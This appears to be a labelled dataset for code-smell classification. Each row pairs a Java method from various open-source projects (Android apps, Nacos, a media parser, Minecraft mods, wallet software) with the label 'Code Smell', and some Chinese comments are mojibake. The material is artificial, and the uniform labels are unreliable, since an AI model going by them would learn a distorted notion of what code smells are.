text,label,text_label
"@Override public void onActivityResult(int requestCode,int resultCode,Intent data){
  if (requestCode == SCAN_RESULT && resultCode == Activity.RESULT_OK && BarcodeScanner.isValidResult(data)) {
    Barcode code=BarcodeScanner.getResult(data);
    if (code != null) {
      if (code.rawValue.startsWith(""https:"") || code.rawValue.startsWith(""http:"")) {
        ((MainActivity)getActivity()).handleURL(Uri.parse(code.rawValue),accountID);
        dismiss();
      }
 else {
        Toast.makeText(themeWrapper,R.string.link_not_supported,Toast.LENGTH_SHORT).show();
      }
    }
  }
}
",1,Code Smell
"private void saveLog(Method method,boolean flag,LogRecordOps operation,String operatorIdFromService,String action,Map<String,String> expressionValues){
  if (StringUtils.isEmpty(expressionValues.get(action)) || (!diffLog && action.contains(""#"") && Objects.equals(action,expressionValues.get(action)))) {
    return;
  }
  LogRecord logRecord=LogRecord.builder().tenant(tenantId).type(expressionValues.get(operation.getType())).bizNo(expressionValues.get(operation.getBizNo())).operator(getRealOperatorId(operation,operatorIdFromService,expressionValues)).subType(expressionValues.get(operation.getSubType())).extra(expressionValues.get(operation.getExtra())).codeVariable(getCodeVariable(method)).action(expressionValues.get(action)).fail(flag).createTime(new Date()).build();
  bizLogService.record(logRecord);
}
",1,Code Smell
"@PostMapping(""/readiness"") public String serverReady(@RequestParam(value=""broadcast"",required=false) boolean broadcast){
  log.info(""receive readiness access...."");
  boolean readiness=true;
  if (!broadcast) {
    List<Server> servers=serverListManager.getServers();
    if (!CollectionUtils.isEmpty(servers)) {
      for (      Server server : servers) {
        String url=String.format(""http://%s:%s/nacos/readiness?broadcast=true"",server.getIp(),server.getServePort());
        ResponseEntity<String> responseEntity=restTemplate.postForEntity(url,null,String.class);
        if (HttpStatus.OK.value() != responseEntity.getStatusCode().value()) {
          readiness=false;
          log.warn(""readiness failed..., code={}"",responseEntity.getStatusCode());
        }
      }
    }
  }
  if (readiness) {
    serverReady=true;
    return ""success"";
  }
  return ""failed"";
}
",1,Code Smell
"/** 
 * 涓虹┖鎼滅储
 * @param search       鎼滅储鏉′欢
 * @param queryBuilder 鏌ヨ鍣�
 */
private static void isNullSearch(CrmSearchBO.Search search,BoolQueryBuilder queryBuilder){
  FieldEnum fieldEnum=FieldEnum.parse(search.getFormType());
  if (Arrays.asList(FieldEnum.DATETIME,FieldEnum.DATE,FieldEnum.NUMBER,FieldEnum.FLOATNUMBER).contains(fieldEnum)) {
    queryBuilder.mustNot(QueryBuilders.existsQuery(search.getName()));
  }
 else {
    BoolQueryBuilder builder=QueryBuilders.boolQuery();
    builder.should(QueryBuilders.termQuery(search.getName(),""""));
    builder.should(QueryBuilders.boolQuery().mustNot(QueryBuilders.existsQuery(search.getName())));
    queryBuilder.filter(builder);
  }
}
",1,Code Smell
"public static DriverFileIO create(Emulator<?> emulator,int oflags,String pathname){
  if (""/dev/urandom"".equals(pathname) || ""/dev/random"".equals(pathname) || ""/dev/srandom"".equals(pathname)) {
    return new RandomFileIO(emulator,pathname);
  }
  if (""/dev/null"".equals(pathname)) {
    return new DriverFileIO(emulator,oflags,pathname);
  }
  return null;
}
",1,Code Smell
"protected void shiftBuckets(long tableAddr,long pos,long mask){
  long last;
  long slot;
  int currX;
  long currValue;
  for (; ; ) {
    pos=((last=pos) + 1L) & mask;
    for (; ; pos=(pos + 1L) & mask) {
      long currAddr=tableAddr + pos * BUCKET_BYTES;
      if ((currValue=PUnsafe.getLong(currAddr + BUCKET_VALUE_OFFSET)) == 0L) {
        PUnsafe.setMemory(tableAddr + last * BUCKET_BYTES,BUCKET_BYTES,(byte)0);
        return;
      }
      slot=hashPosition(currX=PUnsafe.getInt(currAddr + BUCKET_KEY_OFFSET + KEY_X_OFFSET)) & mask;
      if (last <= pos ? last >= slot || slot > pos : last >= slot && slot > pos) {
        long lastAddr=tableAddr + last * BUCKET_BYTES;
        PlatformDependent.putInt(lastAddr + BUCKET_KEY_OFFSET + KEY_X_OFFSET,currX);
        PlatformDependent.putLong(lastAddr + BUCKET_VALUE_OFFSET,currValue);
        break;
      }
    }
  }
}",1,Code Smell
"private Collection<BaseDanmaku> subset(long startTime,long endTime){
  if (mSortType == ST_BY_LIST || items == null || items.size() == 0) {
    return null;
  }
  if (subItems == null) {
    subItems=new Danmakus(mDuplicateMergingEnabled);
    subItems.mLockObject=this.mLockObject;
  }
  if (startSubItem == null) {
    startSubItem=createItem(""start"");
  }
  if (endSubItem == null) {
    endSubItem=createItem(""end"");
  }
  startSubItem.setTime(startTime);
  endSubItem.setTime(endTime);
  return ((SortedSet<BaseDanmaku>)items).subSet(startSubItem,endSubItem);
}",1,Code Smell
"private int findItem(ItemStack itemStack,int excludedSlot,int goodEnoughCount){
  int slot=-1;
  int count=0;
  for (int i=mc.player.getInventory().size() - 2; i >= (searchHotbar.get() ? 0 : 9); i--) {
    ItemStack stack=mc.player.getInventory().getStack(i);
    if (i != excludedSlot && stack.getItem() == itemStack.getItem() && ItemStack.areItemsAndComponentsEqual(itemStack,stack)) {
      if (stack.getCount() > count) {
        slot=i;
        count=stack.getCount();
        if (count >= goodEnoughCount)         break;
      }
    }
  }
  return slot;
}",1,Code Smell
"/** 
 * 查找(x, y)处最深的节点
 * @param root
 * @param x
 * @param y
 * @return
 */
public static AbstractNodeTree findDeepestNode(AbstractNodeTree root,int x,int y){
  if (root == null || !root.getNodeBound().contains(x,y)) {
    LogUtil.w(TAG,""Root为空或者不包含坐标位置"");
    return null;
  }
  List<AbstractNodeTree> candiateNodes=new ArrayList<>();
  Queue<AbstractNodeTree> findQueue=new LinkedList<>();
  AbstractNodeTree targetWindow=root;
  if (root instanceof FakeNodeTree) {
    List<AbstractNodeTree> windows=root.getChildrenNodes();
    int maxIdx=-1;
    for (    AbstractNodeTree window : windows) {
      if (window instanceof InputWindowTree) {
        if (window.getNodeBound().contains(x,y)) {
          return window;
        }
      }
      if (window.getDrawingOrder() > maxIdx && window.getNodeBound().contains(x,y)) {
        maxIdx=window.getDrawingOrder();
        targetWindow=window;
      }
    }
  }
  findQueue.add(targetWindow);
  AbstractNodeTree currentNode;
  while ((currentNode=findQueue.poll()) != null) {
    boolean contains=currentNode.getNodeBound().contains(x,y);
    if (contains && (currentNode.isSelfUsableForLocating() || (currentNode.getChildrenNodes() != null && currentNode.getChildrenNodes().size() > 0))) {
      candiateNodes.add(currentNode);
    }
    if (currentNode.getChildrenNodes() != null) {
      findQueue.addAll(currentNode.getChildrenNodes());
    }
  }
  LogUtil.d(TAG,""get nodes count:"" + candiateNodes.size());
  if (candiateNodes.size() == 0) {
    return null;
  }
  AbstractNodeTree min=candiateNodes.get(0);
  int minSize=calculateRectSize(min.getNodeBound());
  for (  AbstractNodeTree node : candiateNodes) {
    int curSize=calculateRectSize(node.getNodeBound());
    if (curSize < minSize) {
      min=node;
      minSize=curSize;
    }
 else     if (curSize == minSize) {
      if (node.hasParent(min)) {
        min=node;
      }
    }
  }
  return min;
}",1,Code Smell
"/** 
 * Create a new instance of a PullParserFactory that can be used to create XML pull parsers (see class description for more details).
 * @return a new instance of a PullParserFactory, as returned by newInstance (null, null); 
 */
public static XmlPullParserFactory newInstance() throws XmlPullParserException {
  return newInstance(null,null);
}
public static XmlPullParserFactory newInstance(String classNames,Class context) throws XmlPullParserException {
  if (context == null) {
    context=referenceContextClass;
  }
  String classNamesLocation=null;
  if (classNames == null || classNames.length() == 0 || ""DEFAULT"".equals(classNames)) {
    try {
      InputStream is=context.getResourceAsStream(RESOURCE_NAME);
      if (is == null)       throw new XmlPullParserException(""resource not found: "" + RESOURCE_NAME + "" make sure that parser implementing XmlPull API is available"");
      final StringBuffer sb=new StringBuffer();
      while (true) {
        final int ch=is.read();
        if (ch < 0)         break;
 else         if (ch > ' ')         sb.append((char)ch);
      }
      is.close();
      classNames=sb.toString();
    }
 catch (    Exception e) {
      throw new XmlPullParserException(null,null,e);
    }
    classNamesLocation=""resource "" + RESOURCE_NAME + "" that contained '""+ classNames+ ""'"";
  }
 else {
    classNamesLocation=""parameter classNames to newInstance() that contained '"" + classNames + ""'"";
  }
  XmlPullParserFactory factory=null;
  final Vector parserClasses=new Vector();
  final Vector serializerClasses=new Vector();
  int pos=0;
  while (pos < classNames.length()) {
    int cut=classNames.indexOf(',',pos);
    if (cut == -1)     cut=classNames.length();
    final String name=classNames.substring(pos,cut);
    Class candidate=null;
    Object instance=null;
    try {
      candidate=Class.forName(name);
      instance=candidate.newInstance();
    }
 catch (    Exception e) {
    }
    if (candidate != null) {
      boolean recognized=false;
      if (instance instanceof XmlPullParser) {
        parserClasses.addElement(candidate);
        recognized=true;
      }
      if (instance instanceof XmlSerializer) {
        serializerClasses.addElement(candidate);
        recognized=true;
      }
      if (instance instanceof XmlPullParserFactory) {
        if (factory == null) {
          factory=(XmlPullParserFactory)instance;
        }
        recognized=true;
      }
      if (!recognized) {
        throw new XmlPullParserException(""incompatible class: "" + name);
      }
    }
    pos=cut + 1;
  }
  if (factory == null) {
    factory=new XmlPullParserFactory();
  }
  factory.parserClasses=parserClasses;
  factory.serializerClasses=serializerClasses;
  factory.classNamesLocation=classNamesLocation;
  return factory;
}",1,Code Smell
"/** 
 * Reads the number of short term reference picture sets in a SPS as ue(v), then skips all of them. See H.265/HEVC (2014) 7.3.7.
 */
private static void skipShortTermRefPicSets(ParsableNalUnitBitArray bitArray){
  int numShortTermRefPicSets=bitArray.readUnsignedExpGolombCodedInt();
  boolean interRefPicSetPredictionFlag=false;
  int numNegativePics;
  int numPositivePics;
  int previousNumDeltaPocs=0;
  for (int stRpsIdx=0; stRpsIdx < numShortTermRefPicSets; stRpsIdx++) {
    if (stRpsIdx != 0) {
      interRefPicSetPredictionFlag=bitArray.readBit();
    }
    if (interRefPicSetPredictionFlag) {
      bitArray.skipBit();
      bitArray.readUnsignedExpGolombCodedInt();
      for (int j=0; j <= previousNumDeltaPocs; j++) {
        if (bitArray.readBit()) {
          bitArray.skipBit();
        }
      }
    }
 else {
      numNegativePics=bitArray.readUnsignedExpGolombCodedInt();
      numPositivePics=bitArray.readUnsignedExpGolombCodedInt();
      previousNumDeltaPocs=numNegativePics + numPositivePics;
      for (int i=0; i < numNegativePics; i++) {
        bitArray.readUnsignedExpGolombCodedInt();
        bitArray.skipBit();
      }
      for (int i=0; i < numPositivePics; i++) {
        bitArray.readUnsignedExpGolombCodedInt();
        bitArray.skipBit();
      }
    }
  }
}",1,Code Smell
"@Override protected void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  if (Build.VERSION.SDK_INT >= 23 && Build.VERSION.SDK_INT < 29 && !isStorageAllowed(this))   requestStoragePermission();
 else   exit();
}",1,Code Smell
"public static byte[] getFileAttributes(File file){
  try {
    if (file == null || (!Files.isSymbolicLink(file.toPath()) && !file.exists())) {
      return new byte[4];
    }
    Path path=file.toPath();
    if (isWindows()) {
      return getWindowsFileAttributes(path);
    }
 else     if (isMac() || isUnix()) {
      return getPosixFileAttributes(path);
    }
 else {
      return new byte[4];
    }
  }
 catch (  NoSuchMethodError e) {
    return new byte[4];
  }
}",1,Code Smell
"private void hookOnHolder(){
  Class<?> recentContactItemHolderClass=ClassUtils.getClass(""com.tencent.qqnt.chats.core.adapter.holder.RecentContactItemHolder"");
  Method onHolderBindTimeingCallSetOnClickMethod=null;
  for (  Method method : recentContactItemHolderClass.getDeclaredMethods()) {
    Class<?>[] paramTypes=method.getParameterTypes();
    if (paramTypes.length == 3) {
      if (paramTypes[0].getName().startsWith(""com.tencent.qqnt.chats.core.adapter.builder."") && paramTypes[1].getName().startsWith(""com.tencent.qqnt.chats.core.adapter."") && paramTypes[2] == int.class) {
        method.setAccessible(true);
        onHolderBindTimeingCallSetOnClickMethod=method;
        break;
      }
    }
  }
  HookUtils.hookBeforeIfEnabled(cleanRecentChat,onHolderBindTimeingCallSetOnClickMethod,param -> {
    int adapterIndex=(int)param.args[2];
    Object item=param.args[1];
    viewHolderList.put(param.thisObject,adapterIndex);
  }
);
  Method onCreate=MethodTool.find(""com.tencent.qqnt.chats.core.adapter.ChatsListAdapter"").name(""onCreateViewHolder"").params(android.view.ViewGroup.class,int.class).get();
  HookUtils.hookAfterIfEnabled(cleanRecentChat,onCreate,param -> {
    viewHolderList.put(param.getResult(),(int)param.args[1]);
  }
);
}",1,Code Smell
"/** 
 * Sends the message and returns whether the message was sent to its target. 
 */
public boolean maybeSendToTarget(long currentTimeMs){
  if (postTime <= currentTimeMs) {
    if (runnable != null) {
      handler.post(runnable);
    }
 else {
      handler.sendEmptyMessage(message);
    }
    return true;
  }
  return false;
}
",1,Code Smell
"int getSubPositionByView(View view,View childView){
  if (view == null || childView == null) {
    return 0;
  }
  final LayoutParams lp=(LayoutParams)view.getLayoutParams();
  final ItemAlignmentFacet facet=lp.getItemAlignmentFacet();
  if (facet != null) {
    final ItemAlignmentFacet.ItemAlignmentDef[] defs=facet.getAlignmentDefs();
    if (defs.length > 1) {
      while (childView != view) {
        int id=childView.getId();
        if (id != View.NO_ID) {
          for (int i=1; i < defs.length; i++) {
            if (defs[i].getItemAlignmentFocusViewId() == id) {
              return i;
            }
          }
        }
        childView=(View)childView.getParent();
      }
    }
  }
  return 0;
}",1,Code Smell
"/** 
 * private method 
 */
private void collectMetrics(Long clusterPhyId,String topicName,Map<Integer,TopicMetrics> metricsMap,List<VersionControlItem> items){
  long startTime=System.currentTimeMillis();
  TopicMetrics aggMetrics=metricsMap.get(AGG_METRICS_BROKER_ID);
  for (  VersionControlItem v : items) {
    try {
      if (aggMetrics.getMetrics().containsKey(v.getName())) {
        continue;
      }
      Result<List<TopicMetrics>> ret=topicMetricService.collectTopicMetricsFromKafkaWithCacheFirst(clusterPhyId,topicName,v.getName());
      if (null == ret || ret.failed() || ValidateUtils.isEmptyList(ret.getData())) {
        continue;
      }
      ret.getData().stream().forEach(metrics -> {
        if (metrics.isBBrokerAgg()) {
          aggMetrics.putMetric(metrics.getMetrics());
        }
 else {
          metricsMap.putIfAbsent(metrics.getBrokerId(),new TopicMetrics(topicName,clusterPhyId,metrics.getBrokerId(),false));
          metricsMap.get(metrics.getBrokerId()).putMetric(metrics.getMetrics());
        }
      }
);
    }
 catch (    Exception e) {
      LOGGER.error(""method=collectMetrics||clusterPhyId={}||topicName={}||metricName={}||errMsg=exception!"",clusterPhyId,topicName,v.getName(),e);
    }
  }
  aggMetrics.putMetric(Constant.COLLECT_METRICS_COST_TIME_METRICS_NAME,(System.currentTimeMillis() - startTime) / 1000.0f);
}",1,Code Smell
"@Override public Flux<MqttMessage> subscribe(List<String> topics,int qos){
  return Flux.create(sink -> {
    Disposable.Composite composite=Disposables.composite();
    for (    String topic : topics) {
      String realTopic=parseTopic(topic);
      String completeTopic=getCompleteTopic(topic);
      Topic<Tuple3<String,FluxSink<MqttMessage>,Integer>> sinkTopic=subscriber.append(realTopic.replace(""#"",""**"").replace(""+"",""*""));
      Tuple3<String,FluxSink<MqttMessage>,Integer> topicQos=Tuples.of(topic,sink,qos);
      boolean first=sinkTopic.getSubscribers().isEmpty();
      sinkTopic.subscribe(topicQos);
      composite.add(() -> {
        if (!sinkTopic.unsubscribe(topicQos).isEmpty() && isAlive() && sinkTopic.getSubscribers().isEmpty()) {
          client.unsubscribe(convertMqttTopic(completeTopic),result -> {
            if (result.succeeded()) {
              log.debug(""unsubscribe mqtt topic {}"",completeTopic);
            }
 else {
              log.debug(""unsubscribe mqtt topic {} error"",completeTopic,result.cause());
            }
          }
);
        }
      }
);
      if (isAlive() && first) {
        log.debug(""subscribe mqtt topic {}"",completeTopic);
        client.subscribe(convertMqttTopic(completeTopic),qos,result -> {
          if (!result.succeeded()) {
            sink.error(result.cause());
          }
        }
);
      }
    }
    sink.onDispose(composite);
  }
);
}",1,Code Smell
"public static byte[] imageToPdf(MultipartFile[] files,String fitOption,boolean autoRotate,String colorType) throws IOException {
  try (PDDocument doc=new PDDocument()){
    for (    MultipartFile file : files) {
      String contentType=file.getContentType();
      String originalFilename=Filenames.toSimpleFileName(file.getOriginalFilename());
      if (originalFilename != null && (originalFilename.toLowerCase().endsWith("".tiff"") || originalFilename.toLowerCase().endsWith("".tif""))) {
        ImageReader reader=ImageIO.getImageReadersByFormatName(""tiff"").next();
        reader.setInput(ImageIO.createImageInputStream(file.getInputStream()));
        int numPages=reader.getNumImages(true);
        for (int i=0; i < numPages; i++) {
          BufferedImage pageImage=reader.read(i);
          BufferedImage convertedImage=ImageProcessingUtils.convertColorType(pageImage,colorType);
          PDImageXObject pdImage=LosslessFactory.createFromImage(doc,convertedImage);
          addImageToDocument(doc,pdImage,fitOption,autoRotate);
        }
      }
 else {
        BufferedImage image=ImageIO.read(file.getInputStream());
        BufferedImage convertedImage=ImageProcessingUtils.convertColorType(image,colorType);
        PDImageXObject pdImage=(contentType != null && ""image/jpeg"".equals(contentType)) ? JPEGFactory.createFromImage(doc,convertedImage) : LosslessFactory.createFromImage(doc,convertedImage);
        addImageToDocument(doc,pdImage,fitOption,autoRotate);
      }
    }
    ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
    doc.save(byteArrayOutputStream);
    logger.info(""PDF successfully saved to byte array"");
    return byteArrayOutputStream.toByteArray();
  }
 }",1,Code Smell
"@Override public WalletModel getWalletModel(){
  return WalletModel.SPECTER_DESKTOP;
}
public WalletModel getWalletModel(){
  if (type != null) {
    String model=type;
    if (model.equals(""cobo"")) {
      model=""cobovault"";
    }
    WalletModel walletModel=WalletModel.fromType(model);
    if (walletModel == WalletModel.SPECTER_DESKTOP) {
      walletModel=WalletModel.SPECTER_DIY;
    }
    if (walletModel == WalletModel.TREZOR_1) {
      walletModel=WalletModel.TREZOR_T;
    }
    return walletModel;
  }
  return null;
}",1,Code Smell
"private File getTemporaryExtraction(long after){
  File tmpDir=new File(System.getProperty(""java.io.tmpdir""));
  if (!tmpDir.exists()) {
    return null;
  }
  File[] tmps=tmpDir.listFiles(file -> {
    if (!file.isDirectory() || file.lastModified() < after) {
      return false;
    }
    String name=file.getName();
    if (name.length() < 9 || !name.startsWith(""_MEI"")) {
      return false;
    }
    File hwilib=new File(file,""hwilib"");
    return hwilib.exists();
  }
);
  return tmps == null || tmps.length == 0 ? null : Arrays.stream(tmps).sorted(Comparator.comparingLong(File::lastModified)).findFirst().orElse(null);
}",1,Code Smell
"private static int[] generateDefault8BitClutEntries(){
  int[] entries=new int[256];
  entries[0]=0x00000000;
  for (int i=0; i < entries.length; i++) {
    if (i < 8) {
      entries[i]=getColor(0x3F,((i & 0x01) != 0 ? 0xFF : 0x00),((i & 0x02) != 0 ? 0xFF : 0x00),((i & 0x04) != 0 ? 0xFF : 0x00));
    }
 else {
switch (i & 0x88) {
case 0x00:
        entries[i]=getColor(0xFF,(((i & 0x01) != 0 ? 0x55 : 0x00) + ((i & 0x10) != 0 ? 0xAA : 0x00)),(((i & 0x02) != 0 ? 0x55 : 0x00) + ((i & 0x20) != 0 ? 0xAA : 0x00)),(((i & 0x04) != 0 ? 0x55 : 0x00) + ((i & 0x40) != 0 ? 0xAA : 0x00)));
      break;
case 0x08:
    entries[i]=getColor(0x7F,(((i & 0x01) != 0 ? 0x55 : 0x00) + ((i & 0x10) != 0 ? 0xAA : 0x00)),(((i & 0x02) != 0 ? 0x55 : 0x00) + ((i & 0x20) != 0 ? 0xAA : 0x00)),(((i & 0x04) != 0 ? 0x55 : 0x00) + ((i & 0x40) != 0 ? 0xAA : 0x00)));
  break;
case 0x80:
entries[i]=getColor(0xFF,(127 + ((i & 0x01) != 0 ? 0x2B : 0x00) + ((i & 0x10) != 0 ? 0x55 : 0x00)),(127 + ((i & 0x02) != 0 ? 0x2B : 0x00) + ((i & 0x20) != 0 ? 0x55 : 0x00)),(127 + ((i & 0x04) != 0 ? 0x2B : 0x00) + ((i & 0x40) != 0 ? 0x55 : 0x00)));
break;
case 0x88:
entries[i]=getColor(0xFF,(((i & 0x01) != 0 ? 0x2B : 0x00) + ((i & 0x10) != 0 ? 0x55 : 0x00)),(((i & 0x02) != 0 ? 0x2B : 0x00) + ((i & 0x20) != 0 ? 0x55 : 0x00)),(((i & 0x04) != 0 ? 0x2B : 0x00) + ((i & 0x40) != 0 ? 0x55 : 0x00)));
break;
}
}
}
return entries;
}",1,Code Smell
"/** 
 * 鑾峰彇鎸囧畾鍗曞厓鐨� http client
 * @param unit 鍗曞厓瀵硅薄
 * @return http client
 */
public static OkHttpClient getHttpClient(UnitDO unit){
  OkHttpClient httpClient;
  if (unit.getEndpoint().contains(LOCALHOST)) {
    httpClient=HttpClientFactory.getHttpClient();
  }
 else   if (StringUtils.isNotEmpty(unit.getProxyIp()) && Integer.parseInt(unit.getProxyPort()) > 0) {
    httpClient=HttpClientFactory.getHttpClient(unit.getProxyIp(),Integer.parseInt(unit.getProxyPort()));
  }
 else {
    httpClient=HttpClientFactory.getHttpClient();
  }
  return httpClient;
}",1,Code Smell
"public boolean manageFlows(Level world,BlockPos pos,FluidStack internalFluid,Predicate<FluidStack> extractionPredicate){
  Optional<FluidNetwork> retainedNetwork=network;
  network=Optional.empty();
  if (!source.isPresent() && !determineSource(world,pos))   return false;
  FlowSource flowSource=source.get();
  if (!hasFlow()) {
    if (!hasPressure())     return false;
    boolean prioritizeInbound=comparePressure() < 0;
    for (    boolean trueFalse : Iterate.trueAndFalse) {
      boolean inbound=prioritizeInbound == trueFalse;
      if (pressure.get(inbound) == 0)       continue;
      if (tryStartingNewFlow(inbound,inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid))       return true;
    }
    return false;
  }
  Flow flow=this.flow.get();
  FluidStack provided=flow.inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid;
  if (!hasPressure() || provided.isEmpty() || !provided.isFluidEqual(flow.fluid)) {
    this.flow=Optional.empty();
    return true;
  }
  if (flow.inbound != comparePressure() < 0) {
    boolean inbound=!flow.inbound;
    if (inbound && !provided.isEmpty() || !inbound && !internalFluid.isEmpty()) {
      FluidPropagator.resetAffectedFluidNetworks(world,pos,side);
      tryStartingNewFlow(inbound,inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid);
      return true;
    }
  }
  flowSource.whileFlowPresent(world,flow.inbound);
  if (!flowSource.isEndpoint())   return false;
  if (!flow.inbound)   return false;
  network=retainedNetwork;
  if (!hasNetwork())   network=Optional.of(new FluidNetwork(world,new BlockFace(pos,side),flowSource::provideHandler));
  network.get().tick();
  return false;
}",1,Code Smell
"@Override public void visitProgramClass(ProgramClass programClass){
  if ((programClass.u2accessFlags & (AccessConstants.FINAL | AccessConstants.INTERFACE | AccessConstants.ABSTRACT)) == 0 && !KeepMarker.isKept(programClass) && programClass.subClassCount == 0) {
    programClass.u2accessFlags|=AccessConstants.FINAL;
    if (extraClassVisitor != null) {
      extraClassVisitor.visitProgramClass(programClass);
    }
  }
}",1,Code Smell
"private BitcoinURI getPayjoinURI(){
  if (headersForm.getPsbt() != null) {
    for (    TransactionOutput txOutput : headersForm.getPsbt().getTransaction().getOutputs()) {
      try {
        Address address=txOutput.getScript().getToAddresses()[0];
        BitcoinURI bitcoinURI=AppServices.getPayjoinURI(address);
        if (bitcoinURI != null) {
          return bitcoinURI;
        }
      }
 catch (      Exception e) {
      }
    }
  }
  return null;
}",1,Code Smell
"/** 
 * 鑾峰彇璺敱鍦板潃
 * @param menu 鑿滃崟淇℃伅
 * @return 璺敱鍦板潃
 */
public String getRouterPath(SysMenu menu){
  String routerPath=menu.getPath();
  if (menu.getParentId().intValue() != 0 && isInnerLink(menu)) {
    routerPath=innerLinkReplaceEach(routerPath);
  }
  if (0 == menu.getParentId().intValue() && UserConstants.TYPE_DIR.equals(menu.getMenuType()) && UserConstants.NO_FRAME.equals(menu.getIsFrame())) {
    routerPath=""/"" + menu.getPath();
  }
 else   if (isMenuFrame(menu)) {
    routerPath=""/"";
  }
  return routerPath;
}",1,Code Smell
"/** 
 * Returns whether the given word is a valid Java identifier. Wildcard characters are accepted.
 */
private boolean isJavaIdentifier(String word){
  if (word.length() == 0) {
    return false;
  }
  for (int index=0; index < word.length(); index++) {
    char c=word.charAt(index);
    if (!(Character.isJavaIdentifierPart(c) || c == '.' || c == '[' || c == ']' || c == '<' || c == '>' || c == '-' || c == '!' || c == '*' || c == '?' || c == '%')) {
      return false;
    }
  }
  return true;
}",1,Code Smell
"private void tickAudio(){
  Vec3 vec=VecHelper.getCenterOf(worldPosition);
  if (lid.settled()) {
    if (openCount > 0 && lid.getChaseTarget() == 0) {
      level.playLocalSound(vec.x,vec.y,vec.z,SoundEvents.IRON_DOOR_OPEN,SoundSource.BLOCKS,0.25F,level.random.nextFloat() * 0.1F + 1.2F,true);
      level.playLocalSound(vec.x,vec.y,vec.z,SoundEvents.CHEST_OPEN,SoundSource.BLOCKS,0.1F,level.random.nextFloat() * 0.1F + 1.1F,true);
    }
    if (openCount == 0 && lid.getChaseTarget() == 1)     level.playLocalSound(vec.x,vec.y,vec.z,SoundEvents.CHEST_CLOSE,SoundSource.BLOCKS,0.1F,level.random.nextFloat() * 0.1F + 1.1F,true);
  }
 else   if (openCount == 0 && lid.getChaseTarget() == 0 && lid.getValue(0) > 1 / 16f && lid.getValue(1) < 1 / 16f)   level.playLocalSound(vec.x,vec.y,vec.z,SoundEvents.IRON_DOOR_CLOSE,SoundSource.BLOCKS,0.25F,level.random.nextFloat() * 0.1F + 1.2F,true);
}",1,Code Smell
"private List<String> tokenize(String json){
  List<String> list=new ArrayList<>();
  int index=0;
  int inObject=0;
  int inList=0;
  boolean inValue=false;
  boolean inEscape=false;
  StringBuilder build=new StringBuilder();
  while (index < json.length()) {
    char current=json.charAt(index);
    if (inEscape) {
      build.append(current);
      index++;
      inEscape=false;
      continue;
    }
    if (current == '{') {
      inObject++;
    }
    if (current == '}') {
      inObject--;
    }
    if (current == '[') {
      inList++;
    }
    if (current == ']') {
      inList--;
    }
    if (current == '""') {
      inValue=!inValue;
    }
    if (current == ',' && inObject == 0 && inList == 0 && !inValue) {
      list.add(build.toString());
      build.setLength(0);
    }
 else     if (current == '\\') {
      inEscape=true;
    }
 else {
      build.append(current);
    }
    index++;
  }
  if (build.length() > 0) {
    list.add(build.toString());
  }
  return list;
}",1,Code Smell
"/** 
 * Returns the API level corresponding to the given magic number, or  {@code -1} if the given arrayis not a well-formed dex file magic number.
 * @param magic array of bytes containing DEX file magic string
 * @return API level corresponding to magic string if valid, -1 otherwise.
 */
public static int magicToApi(byte[] magic){
  if (magic.length != 8) {
    return -1;
  }
  if ((magic[0] != 'd') || (magic[1] != 'e') || (magic[2] != 'x')|| (magic[3] != '\n')|| (magic[7] != '\0')) {
    return -1;
  }
  String version="""" + ((char)magic[4]) + ((char)magic[5])+ ((char)magic[6]);
  if (version.equals(VERSION_FOR_API_13)) {
    return API_NO_EXTENDED_OPCODES;
  }
 else   if (version.equals(VERSION_FOR_API_24)) {
    return API_DEFINE_INTERFACE_METHODS;
  }
 else   if (version.equals(VERSION_FOR_API_26)) {
    return API_METHOD_HANDLES;
  }
 else   if (version.equals(VERSION_FOR_API_28)) {
    return API_CONST_METHOD_HANDLE;
  }
 else   if (version.equals(VERSION_CURRENT)) {
    return API_CURRENT;
  }
  return -1;
}",1,Code Smell
